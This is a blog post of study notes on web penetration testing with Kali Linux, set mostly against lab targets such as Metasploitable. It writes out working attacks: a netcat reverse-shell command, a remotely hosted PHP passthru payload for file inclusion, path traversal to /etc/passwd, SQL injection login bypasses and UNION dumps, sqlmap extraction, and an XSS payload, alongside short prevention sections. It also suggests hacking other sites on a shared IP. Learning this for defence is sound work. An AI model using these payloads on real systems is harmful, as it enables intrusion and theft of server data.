Title: Web Penetration Testing with Kali Linux
Date: 2020-05-xx
Author: Jack McKew
Category: Software, infosec
Tags: software, infosec

This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: <https://www.kali.org/downloads/>.

This post is apart of a series of posts, see the other posts at:

- INSERT NETWORK POST
- INSERT ACCESS POST

> Thank you to Chris B for helping me with the notes in this post below!

## Web Information Gathering

As per the last two posts, information is power is security. So we always start by gathering as much information as possible about the target as this may inform us on the best way to carry out an attack.

Some helpful tools for learning information about websites are:

1. <http://whois.domaintools.com/>
    - Find info about the owner of the target, also possibly webserver results. Look at hosting and info, possibly for social engineering.
2. <https://sitereport.netcraft.com/>
    - Shows technologies used on the target. Look at the technologies used for exploits, and coding languages used (code your virus in  languages that the server can understand).  
3. <https://www.exploit-db.com/>
    - Database of exploits, make sure versions match.
4. <https://www.robtex.com/>
    - Comprehensive DNS information.

Several websites can be installed on a single computer (same IP). If you cannot get into your target try to hack into another website. Another way of getting websites on the same IP (other than Robtex) is to go to bing and search `ip:[target_ip]`.

### Discovering Subdomains

Use a tool called knock (typically install into /opt on Kali). As with most of the tools on Kali linux, Knock is open source and can be found <https://github.com/guelfoweb/knock>.

1. `git clone <https://github.com/guelfoweb/knock.git>`
2. cd into the folder.
3. run it using, `python knock.py [target]`
    - if doesn't work try running the above with --resolve , then run the above again.

Subdomains sometimes contain beta testing applications and scripts. look for exploits in these areas.

### Discovering Sensitive Files

Use [dirb](https://tools.kali.org/web-applications/dirb) (use `man dirb` for help). DIRB is a web content scanner, which looks for existing (or hidden) Web Objects. DIRB works by launching a dictionary attack against a web server and analyses the response (essentially just try different file names and see if it has a response).

1. `dirb [target] [wordlist] [options]`
2. a / usually means you are in a directory.
3. phpinfo.php - very useful information, robots.txt -hidden information that admins don't want us to see.

### Exploiting File Upload Vulnerabilities to Gain Access

Using a tool called [Weevely](https://tools.kali.org/maintaining-access/weevely). Weevely is a stealthy web shell to simulate a telnet-like connection. This is useful as a backdoor and/or to manage web accounts on a web server.

1. `weevly generate [password] [path+filename]` - create backdoor
2. upload the file.
3. `weevly [url_to_file]` - connect to the file
4. `help` - help

Before trying to use tools just browse the website and get a feel for it, look for exploits in features, specifically if the website allows for an upload.

### Exploiting Code Execution Vulnerabilities

use the provided script [code-execution-reverse-shell-commands]

1. always experiment with any input boxes you see, as they are executing a command, you might be able to change the command.
2. can use && or ; in unix to execute multiple commands in one line. Test if input box allows this.
3. most servers have python and netcat.
4. listen for incoming connections, example using netcat (can also use multi/handler in msfconsole):
    <netcat -vv -l -p [port]> - listens for connections on port 8080
    -- RUN THE COMMANDS IN THE FILE ABOVE ON THE WEBSERVER. if they have a misconfigured input box.
    ie. nc -e /bin/sh [ip] [port] - netcat connection.

Local File inclusion:
Allows an attacker to read ANY file on the same server.
Allows access of outside www folder.

/etc/passwd contains all the users for the current os.

go back into the directorys to find the above file.

so if the url contains something like <page=include.php>
do something like <page=/../../../../../etc/passwd>

Remote file inclusion:
To enable in metaploitable >sudo nano /etc/php5/cgi/php.ini > allow_url_fopen on > allow_url_include > restart webserver >sudo /etc/init.d/apache2 restart

If doing this on an actul server the file you want to access has to have a real ip or domainname.

1. create a php file with the following:

<?php

passthru("[command]");

?>

passthru executes system commands. for example use the netcat command.

MAKE SURE TO STORE THIS FILE ON A WEBSERVER.
Make sure the fileextension is .txt not .php or it runs on your webserver.

1. Listen for connections. <nc -vv -l -p [port]>
2. under the page= part paste the location of your php file. and add a ? to the end to exe as php eg. page=[ip]/[file]?

PREVENTING THE ABOVE:
The above only happens because the server allows it and is misconfigerd

1. File upload Vluns - Do not allow unsfae files to be uploaded. if you are asking for an image MAKRE SURE it is an imgae, never allow exe uploads. CHECK THE FILE TYPE not the exetiosnion.
2. Code exec vulns - Dont use dangerous functions, Filter the input before execution, if you have to use function make sure you analyes the input before exec. USE REGEX.
3. File inclusion vluns - Disbale the allow_url_fopen and allow_url_include settings in php (in the /etc/php5/cgi/php.ini), Use static file inclusion (hard code the files)
 
## SQL Injection and attacks

To connect to a mySQL database <mysql -u [username] -h [ip_of server]>

1. <show databases;>
2. <use [database];>
3. <show tables;>

Discovering sql injections in POST.

1. Whenever you see an input box try to brake it, try using AND, ORDER BY or '.
2. Fix table accounts.metasploit does exist <https://www.youtube.com/watch?v=tYmDiz0SPaw&feature=youtu.be>
3. Look for subtle changes.
4. enter correct info then ' then use AND, use a # as a comment to terminate erly.

Bypassing logins via injections:

1. try to log into admin, in the password terminate and use OR a true statement eg. aa' OR 1=1 #
2. Close qoute after username to ignore password all up ie. admin' #

Discovering SQL injections in GET

1. Always try to inject things in the php scripts (in the address bar it will look like index.php&username=xxxx&password=xxxxx)
2. use ORDER BY after a feild eg. index.php&username=xxxx' ORDER BY 1 #&password=xxxxx USE THE ENCODED sysbols ie. # = %23
3. Order By collum 100000 will return an error keep doing order by 1,2,3,4,5 and when u get an error you know the db has that amount of collums
4. use a union
5. eg. index.php&username=xxxx' union 1,2,3,4,5 #&password=xxxxx
6. swap the numbers with other stuff ie. 1,database(),user(),version(),5
7. union select 1, table_name, null, null,5 from information_schema.tables
8. union select 1, table_name, null, null,5 from information_schema.tables where table_schema = 'owasp10'
9. union select 1, collum_name, null, null,5 from information_schema.collums where table_name = 'accounts'
10. union select 1, username, password, is_admin,5 from accounts.

Read and writing file on the server via sql.

1. union select null, load_file('/etc/passwd'), null, null,null --Reading
2. union select null, 'example example', null, null,null into outfile '[path]' --Writing

Use sqlmap to do the above and more:

1. sqlmap --help
2. sqlmap -u "[target_url]"
3. sqlmap -u "[target_url]" --dbs (- to get the databases.)
4. sqlmap -u "[target_url]" --current-user (-to get user)
5. sqlmap -u "[target_url]" --current-db (current database)
6. sqlmap -u "[target_url]" --tables -D [database] (gets the tables in the -D database)
7. sqlmap -u "[target_url]" --columns -T [table_name] -D [database] (gets columns in the tables of the database)
8. sqlmap -u "[target_url]" -T [table_name] -D [database] --dump (Get all the data in the table of the database)

PREVENTING:
Use filters
Use a blacklist or whitelist.
Best method is to code the web application in a way that does not allow code injection.
To do the above you must use parameterised statements. (where the data and the code are seperated)

First Prepare you statment most langugues have a function for it.
(So the statement is static and only the value will be inserterd eg. prepare(select * from username where username = ?) then when the stament is executed if it will search for the raw input data)
Use filters as second line.
Use a user with the least amount of priviges needed.

## CROSS SITE SCRIPTING(XSS)

Executed on the people browing the website not the server.
Allows javascipt injection onto the page
Code is executed when the page loads

3 main types

1. Persistant/Stored XSS -
2. Reflected XSS - non presistant xss. only will work if the target visits a specially crafted url eg. target.com/page.php?something=<script>alert('xss')</script>
3. DOM bassed XSS

Test textboxes and urls with paramters (the php stuff).

Inject beef hook into vulnable pages. If text areas have a max length, go into devloper console and inspect element and change the max length.

TO prevent:
minimize input.
convert user input to the html charaer symbol so &nsb and instead of & use the &jsjs; thingy
escape the input

TO automaticly discover web vlunabilites
USE Zed Attack Proxy (zap)

1. Search in apps ZAP
2. You have to get this app via github.
3. chmod +x [name]
4. run it
5. after install click no presistant.
6. the cog icon on the left allows options to be modified
7. if you click the green plus on the bottom window then go to active scans. then the little panel in the top left the the windows you can change policys.
8. (leave defaults for now)
9. add the url in automated scan.
10. bottom left under alerts, is where all the vulnrabilites that have been discovered are displayed.
11. if you right click one of the alerts (bottom left) then open in browers it will show you the exploit and how it got it.
